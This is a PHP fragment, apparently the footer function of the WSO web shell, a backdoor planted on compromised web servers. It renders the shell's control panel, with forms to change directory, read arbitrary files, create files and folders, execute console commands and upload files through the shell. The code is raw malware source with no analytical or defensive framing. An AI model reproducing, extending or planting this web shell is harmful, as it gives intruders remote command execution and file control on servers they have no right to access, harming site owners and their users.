<?php

function wsoFooter() {
	$is_writable = is_writable($GLOBALS['cwd'])?" <font color='green'>(Writeable)</font>":" <font color=red>(Not writable)</font>";
    echo "
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
	<tr>
		<td><form onsubmit='g(null,this.c.value,\"\");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='>>'></form></td>
		<td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
	</tr><tr>
		<td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>
		<td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
	</tr><tr>
		<td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>
		<td><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMAn'>
		<input type=hidden name=c value='" . $GLOBALS['cwd'] ."'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
		<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>
	</tr></table></div></body></html>";
}
